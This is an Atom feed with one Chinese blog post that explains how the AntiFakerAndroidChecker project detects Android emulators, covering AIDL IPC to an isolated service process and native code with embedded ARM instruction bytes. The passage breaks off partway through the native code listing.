<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>S1nec-1o&#39;s B1og</title>
  
  
  <link href="http://s1nec-1o.github.io/atom.xml" rel="self"/>
  
  <link href="http://s1nec-1o.github.io/"/>
  <updated>2025-11-03T13:29:47.649Z</updated>
  <id>http://s1nec-1o.github.io/</id>
  
  <author>
    <name>s1nec-1o</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android逆向从入门到入土之AntiFakerAndroidChecker()</title>
    <link href="http://s1nec-1o.github.io/2025/11/03/Android%E9%80%86%E5%90%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E4%B9%8BAntiFakerAndroidChecker/"/>
    <id>http://s1nec-1o.github.io/2025/11/03/Android%E9%80%86%E5%90%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E4%B9%8BAntiFakerAndroidChecker/</id>
    <published>2025-11-03T13:26:59.000Z</published>
    <updated>2025-11-03T13:29:47.649Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文的项目来自于<a href="https://github.com/happylishang/AntiFakerAndroidChecker/">https://github.com/happylishang/AntiFakerAndroidChecker/</a></p><h2 id="模拟器检测"><a href="#模拟器检测" class="headerlink" title="模拟器检测"></a>模拟器检测</h2><h3 id="MainActivity-java"><a href="#MainActivity-java" class="headerlink" title="MainActivity.java"></a>MainActivity.java</h3><p>在demo中展示的就是检测模拟器的代码</p><h3 id="onCreate"><a href="#onCreate" class="headerlink" title="onCreate"></a>onCreate</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">binding = ActivityMainBinding.inflate(getLayoutInflater());</span><br><span class="line">setContentView(binding.getRoot());</span><br><span class="line">mActivity = <span class="built_in">this</span>;</span><br></pre></td></tr></table></figure><p>设置<code>mActivity</code>为当前<code>MainActivity</code>的实例，方便调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  子进程检测是否是模拟器，不影响UI线程</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">binding.btnAsyncSimu.setOnClickListener(v -&gt; EmuCheckUtil.checkEmulatorFromCache(getApplicationContext(),</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">EmuCheckUtil</span>.CheckEmulatorCallBack() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCheckSuccess</span><span class="params">(<span class="type">boolean</span> isEmulator)</span> &#123;</span><br><span class="line">                <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> (TextView) findViewById(R.id.btn_async_simu);</span><br><span class="line">                textView.setText(<span class="string">&quot;  内存异步非UI进程获取是否模拟器 &quot;</span> + isEmulator);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCheckFaild</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> (TextView) findViewById(R.id.btn_async_simu);</span><br><span class="line">                textView.setText(<span class="string">&quot;  内存异步非UI进程获取是否模拟器 失败&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br></pre></td></tr></table></figure><p><strong><code>binding.btnAsyncSimu.setOnClickListener(...)</code></strong></p><ul><li>为布局文件中 ID 为 <code>btn_async_simu</code> 的按钮设置一个点击事件监听器<ul><li>布局文件<code>app\src\main\res\layout\activity_main.xml</code></li></ul></li><li>当用户点击这个按钮时，监听器内部的代码会被执行</li></ul><p>点击事件触发后，会调用 <code>EmuCheckUtil.checkEmulatorFromCache()</code> 方法。这个方法是整个功能的核心</p><h4 id="checkEmulatorFromCache"><a href="#checkEmulatorFromCache" class="headerlink" title="checkEmulatorFromCache"></a>checkEmulatorFromCache</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkEmulatorFromCache</span><span class="params">(<span class="keyword">final</span> Context context, <span class="meta">@NonNull</span> <span class="keyword">final</span> EmuCheckUtil.CheckEmulatorCallBack callBack)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 创建一个 Intent 来标识目标服务。</span></span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(context, EmulatorCheckService.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 绑定到服务。</span></span><br><span class="line">    context.bindService(intent, <span class="keyword">new</span> <span class="title class_">ServiceConnection</span>() &#123;</span><br><span class="line">        <span class="comment">// 这个匿名类处理连接的生命周期。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 连接建立时调用。</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> &#123;</span><br><span class="line">            <span class="comment">// 4. 将原始 IBinder 转换为 AIDL 接口。</span></span><br><span class="line">            <span class="type">IEmulatorCheck</span> <span class="variable">IEmulatorCheck</span> <span class="operator">=</span> com.snail.antifake.IEmulatorCheck.Stub.asInterface(service);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (IEmulatorCheck != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 5. 进行远程调用并传递结果。</span></span><br><span class="line">                    callBack.onCheckSuccess(IEmulatorCheck.isEmulator());</span><br><span class="line">                    <span class="comment">// 6. 获取结果后解除与服务的绑定。</span></span><br><span class="line">                    context.unbindService(<span class="built_in">this</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">                    <span class="comment">// 7. 处理通信错误。</span></span><br><span class="line">                    callBack.onCheckFaild();</span><br><span class="line">                    context.unbindService(<span class="built_in">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 8. 如果连接意外丢失时调用。</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceDisconnected</span><span class="params">(ComponentName name)</span> &#123;</span><br><span class="line">            <span class="comment">// 此实现不执行任何操作，但可用于清理或重试逻辑。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, BIND_AUTO_CREATE); <span class="comment">// 9. 如果服务未运行，则自动创建服务的标志。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>详细分析：</strong></p><ol><li>一开始先创建了一个显式 <code>Intent</code>。<strong>这种类型的 Intent 用于应用程序内部通信</strong>。它明确指明了<strong>目的地</strong>：<code>EmulatorCheckService</code></li><li><code>context.bindService</code> 启动与 <code>intent</code> 指定的服务的连接，第二个参数是<code>ServiceConnection</code> 的实例，这是一个用于<strong>监视连接状态的接口</strong>。这里，它被实现为一个<strong>匿名内部类</strong></li><li>当与 <code>EmulatorCheckService</code> 的连接成功建立后，Android 系统会调用此回调方法。它接收一个 <code>IBinder</code> 对象，它是与远程服务的<strong>原始通信通道</strong></li><li><code>IEmulatorCheck</code> 接口在 <code>.aidl</code> 文件中定义。静态方法 <code>asInterface()</code> 接收来自服务的通用 <code>IBinder</code> 并将其转换为客户端代理对象 (<code>IEmulatorCheck</code>)。这个代理对象具有与远程服务接口相同的方法（例如 <code>isEmulator()</code>），<strong>允许客户端像调用本地方法一样调用它们</strong></li><li>代码现在在代理对象上调用 <code>isEmulator()</code> 方法。这会触发 IPC 机制：方法调用及其参数被“编组”（<strong>序列化</strong>），跨进程边界发送到 <code>EmulatorCheckService</code>，并在那里执行。来自服务的布尔结果随后被“解组”并返回到此处</li><li>成功获取结果后，<strong>客户端解除与服务的绑定</strong>。这对于资源管理至关重要。由于服务可能是通过 <code>BIND_AUTO_CREATE</code> 启动的，一旦所有客户端都解除绑定，系统将自动销毁它</li><li>如果服务进程崩溃或被终止，对远程服务的调用可能会失败。此类故障会抛出 <code>RemoteException</code></li><li>此方法仅在意外断开连接（例如服务进程崩溃）时调用</li><li>**<code>BIND_AUTO_CREATE</code>**此标志告诉 <code>bindService</code> 如果服务尚未运行则创建它</li></ol><blockquote><p><strong>什么是 AIDL？</strong></p><p>AIDL 全称是 <strong>Android Interface Definition Language</strong>，即 <strong>Android 接口定义语言</strong>。</p><p>它是一种 <strong>IPC (Inter-Process Communication，进程间通信)</strong> 机制。当你的 Android 应用需要与另一个应用或服务（尤其是在不同进程中运行的服务）进行通信时，就需要一种双方都能理解的“协议”来传递数据和调用方法。<strong>AIDL 就是用来定义这个协议的工具</strong>。</p><p>它的工作流程大致如下：</p><ol><li><strong>定义接口</strong>：你使用类似 Java 接口的语法在一个 <code>.aidl</code> 文件中声明一个接口，包括你想<strong>暴露给客户端调用的方法</strong>。</li><li><strong>生成代码</strong>：Android SDK 工具会处理这个 <code>.aidl</code> 文件，并自动生成一个同名的 Java 接口文件。这个文件中包含一个名为 <code>Stub</code> 的抽象内部类，它实现了接口并处理了所有远程调用的细节。</li><li><strong>服务端实现</strong>：服务（Service）需要创建一个 <code>Stub</code> 类的实例，并实现你在 <code>.aidl</code> 文件中定义的方法。<code>Service</code> 的 <code>onBind()</code> 方法会返回这个 <code>Stub</code> 实例。</li><li><strong>客户端调用</strong>：客户端在 <code>onServiceConnected()</code> 回调中接收到一个 <code>IBinder</code> 对象。通过调用 <code>YourInterface.Stub.asInterface(binder)</code>，客户端可以得到一个接口的代理对象。之后，客户端就可以像调用本地方法一样调用这个代理对象的方法，而 Android 系统会在底层处理所有跨进程的数据打包（编组）、传输和解包（解组）工作。</li></ol><p><strong>为什么这里使用 AIDL 而不是更简单的方法？</strong></p><p>查看项目中的 <code>AndroidManifest.xml</code> 文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">&quot;.jni.EmulatorCheckService&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">android:process</span>=<span class="string">&quot;:EmulatorCheckService&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>关键在于 <code>android:process=&quot;:EmulatorCheckService&quot;</code> 这一行。</p><p>属性值前面的冒号 (<code>:</code>) 表示这个 Service 将会运行在一个<strong>私有的、独立的进程</strong>中，进程名是 <code>你的应用包名:EmulatorCheckService</code></p><p><strong>既然检测逻辑被刻意放到了一个独立的进程中，那么主应用进程与这个服务进程之间的通信就必须使用 IPC 机制。</strong> AIDL 是 Android 官方提供的、功能强大且高效的 IPC 方式之一，因此被选用</p><p><strong>提高安全性，防止 Hook</strong>：</p><p><strong>Hook 工具通常是注入到目标应用的主进程里</strong>，它们无法直接影响到另一个独立的 <code>EmulatorCheckService</code> 进程。攻击者如果想破解，就必须设法去 Hook 这个新的服务进程，操作更复杂，从而有效地提升了反作弊的门槛。</p></blockquote><blockquote><p><strong>异步性</strong>: 检查不会阻塞主线程，确保流畅的用户体验。</p><p><strong>隔离性</strong>: 通过在单独的进程中运行检查，使得恶意工具（如 Hook 框架）更难从应用程序的主进程中篡改检测逻辑。</p></blockquote><h4 id="EmulatorCheckService"><a href="#EmulatorCheckService" class="headerlink" title="EmulatorCheckService"></a>EmulatorCheckService</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callBack.onCheckSuccess(IEmulatorCheck.isEmulator());</span><br></pre></td></tr></table></figure><p>此处调用<code>isEmulator</code>函数，会触发IPC机制</p><blockquote><p>为什么执行它就是执行EmulatorCheckService的isEmulator函数？</p><p>调用 <code>AIDL</code> 接口的 <code>isEmulator()</code> 方法之所以会执行 <code>EmulatorCheckService</code> 中的 <code>isEmulator()</code> 方法，是因为 Android 系统在背后为你构建了一座“通信桥梁”。这个桥梁由两部分组成：客户端的 <strong>代理（Proxy）</strong> 和服务端的 <strong>存根（Stub）</strong></p><p>当你编译项目时，Android 构建工具会找到 <code>IEmulatorCheck.aidl</code> 文件，并自动生成一个 <code>IEmulatorCheck.java</code> 文件。这个自动生成的文件包含了所有实现跨进程通信所需要的“胶水代码”</p><p>在 <code>EmulatorCheckService.java</code> 中，创建了一个 <code>IEmulatorCheck.Stub</code> 的匿名内部类实例，并实现了 <code>isEmulator()</code> 方法</p><p>当服务启动并被绑定时，这个 <code>Stub</code> 对象（它本身就是一个 <code>IBinder</code>）被 Android 系统传递给了客户端</p><p>这里的 <code>Stub.asInterface(service)</code> 方法做了什么？</p><ul><li>它检查发现客户端和服务端不在同一个进程。</li><li>于是，它创建并返回了一个 <code>IEmulatorCheck.Stub.Proxy</code> 对象。这个 <code>Proxy</code> 对象持有了指向服务端 <code>Binder</code> 的引用。</li></ul><p>所以，<strong>AIDL 接口本身只是一个约定，而自动生成的 <code>Proxy</code> 和 <code>Stub</code> 类才是实现这个约定的“工匠”，它们联手完成了所有复杂的跨进程通信工作，让你感觉就像在调用一个本地方法一样简单。</strong></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmulatorCheckService</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line"></span><br><span class="line">    Handler mHandler=<span class="keyword">new</span> <span class="title class_">Handler</span>();</span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">IEmulatorCheck</span>.Stub() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmulator</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">                <span class="keyword">return</span> EmulatorDetectUtil.isEmulator(EmulatorCheckService.<span class="built_in">this</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">kill</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">                stopSelf();</span><br><span class="line">                mHandler.postDelayed(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                       System.exit(<span class="number">0</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,<span class="number">500</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">        Process.killProcess(Process.myPid());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>EmulatorCheckService</code> 是一个标准的 Android <code>Service</code>。它的特殊之处在于，通过在 <code>AndroidManifest.xml</code> 文件中的配置，它运行在一个<strong>独立的私有进程</strong>中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">&quot;.jni.EmulatorCheckService&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">android:process</span>=<span class="string">&quot;:EmulatorCheckService&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><code>onBind(Intent intent)</code> 方法</p><ul><li><strong>作用</strong>：这是 <code>Service</code> 与客户端（<code>EmuCheckUtil</code>）建立连接的入口点。当客户端调用 <code>bindService()</code> 时，Android 系统会调用这个方法。</li><li><strong>返回值</strong>：它必须返回一个 <code>IBinder</code> 对象，这个对象是客户端与服务端之间通信的桥梁。</li><li><strong>实现方式</strong>：这里直接返回了一个 <code>new IEmulatorCheck.Stub() &#123; ... &#125;</code> 的匿名内部类实例。<code>IEmulatorCheck.Stub</code> 是由 AIDL 工具根据 <code>IEmulatorCheck.aidl</code> 文件自动生成的。我们在这里继承 <code>Stub</code> 类并实现其抽象方法，这就构成了 AIDL 的<strong>服务端实现</strong>。</li></ul><p><code>isEmulator()</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmulator</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">return</span> EmulatorDetectUtil.isEmulator(EmulatorCheckService.<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong>作用</strong>：这是对 AIDL 接口中 <code>isEmulator()</code> 方法的具体实现。当客户端的代理对象调用 <code>isEmulator()</code> 时，经过一系列的 IPC（进程间通信）流程，最终会执行到这里的代码。</p></li><li><p><strong>核心逻辑</strong>：它没有自己实现检测逻辑，而是直接调用了 <code>EmulatorDetectUtil.isEmulator()</code>。</p></li><li><p><strong>关键点</strong>：因为 <code>EmulatorCheckService</code> 运行在独立的进程中</p><p>所以 <code>EmulatorDetectUtil.isEmulator()</code> 这个调用（以及它内部的 native 方法 <code>detectS()</code>）也<strong>发生在这个独立进程中</strong>。这就达到了将检测逻辑与主应用进程隔离的目的，极大地增加了 Hook 攻击的难度。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//antifake\src\main\java\com\snail\antifake\jni\EmulatorDetectUtil.java</span></span><br><span class="line">....</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;emulator_check&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Keep</span></span><br><span class="line">    <span class="keyword">native</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">detectS</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 同时考虑特征值跟cache</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isEmulator</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> detectS();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//CMakeList.txt</span><br><span class="line"><span class="keyword">add_library</span>(</span><br><span class="line">      <span class="comment"># 设置so文件名称.</span></span><br><span class="line">       emulator_check</span><br><span class="line">       <span class="comment"># 设置这个so文件为共享.</span></span><br><span class="line">       SHARED</span><br><span class="line">       <span class="comment"># Provides a relative path to your source file(s).</span></span><br><span class="line">       src/main/jni/emulator/emcheck64.c )</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">getArch</span><span class="params">(JNIEnv *env)</span> </span>&#123;</span><br><span class="line">    jclass cls = (*env)-&gt;<span class="built_in">FindClass</span>(env, <span class="string">&quot;com/snail/antifake/jni/EmulatorDetectUtil&quot;</span>);</span><br><span class="line">    jmethodID mid = (*env)-&gt;<span class="built_in">GetStaticMethodID</span>(env, cls, <span class="string">&quot;getSystemArch&quot;</span>, <span class="string">&quot;()I&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> (jint) (*env)-&gt;<span class="built_in">CallStaticIntMethod</span>(env, cls, mid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">jboolean JNICALL <span class="title">detect</span><span class="params">(JNIEnv *env, jclass jclass1)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">load</span>(env);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> type = <span class="built_in">getArch</span>(env);</span><br><span class="line">    <span class="keyword">if</span> (type == <span class="number">0</span> || type == <span class="number">1</span>) &#123; <span class="keyword">return</span> JNI_TRUE; &#125;</span><br><span class="line">    <span class="type">char</span> code32[] =</span><br><span class="line">            <span class="string">&quot;\x04\xe0\x2d\xE5&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x20\xA0\xE3&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xA0\xE3&quot;</span></span><br><span class="line">            <span class="string">&quot;\x01\x20\x82\xE2&quot;</span></span><br><span class="line">            <span class="string">&quot;\x0c\x30\x4f\xe2&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x10\x93\xE5&quot;</span></span><br><span class="line">            <span class="string">&quot;\x01\x00\x80\xE2&quot;</span></span><br><span class="line">            <span class="string">&quot;\x0c\x30\x4f\xe2&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x10\x83\xE5&quot;</span></span><br><span class="line">            <span class="string">&quot;\x0A\x00\x50\xE3&quot;</span></span><br><span class="line">            <span class="string">&quot;\x02\x00\x00\xAA&quot;</span></span><br><span class="line">            <span class="string">&quot;\x0A\x00\x52\xE3&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\x00\xAA&quot;</span></span><br><span class="line">            <span class="string">&quot;\xf7\xff\xff\xea&quot;</span></span><br><span class="line">            <span class="string">&quot;\x04\xf0\x9d\xE4&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> code64[] =</span><br><span class="line">            <span class="string">&quot;\xff\xc3\x00\xd1&quot;</span><span class="comment">//subsp, sp, #0x30</span></span><br><span class="line">            <span class="string">&quot;\xfd\x7b\x02\xa9&quot;</span><span class="comment">//x29, x30, [sp,#32]</span></span><br><span class="line">            <span class="string">&quot;\x02\x00\x80\xd2&quot;</span><span class="comment">//x2, #0x0</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\x80\xd2&quot;</span><span class="comment">//movx0, #0x0</span></span><br><span class="line">            <span class="string">&quot;\x42\x04\x00\x91&quot;</span><span class="comment">//addx2, x2, #0x1</span></span><br><span class="line">            <span class="string">&quot;\xe3\xff\xff\x10&quot;</span><span class="comment">//adrx3, 18 &lt;smc&gt;</span></span><br><span class="line">            <span class="string">&quot;\x61\x00\x40\xf9&quot;</span><span class="comment">//ldrx1, [x3]</span></span><br><span class="line">            <span class="string">&quot;\x00\x04\x00\x91&quot;</span><span class="comment">//addx0, x0, #0x1</span></span><br><span class="line">            <span class="string">&quot;\xe3\xff\xff\x10&quot;</span><span class="comment">//adrx3, 24 &lt;code&gt;</span></span><br><span class="line">            <span class="string">&quot;\x61\x00\x00\xf9&quot;</span><span class="comment">//strx1, [x3]</span></span><br><span class="line">            <span class="string">&quot;\x1f\x28\x00\xf1&quot;</span> <span class="comment">//cmpx0, #0xa</span></span><br><span class="line">            <span 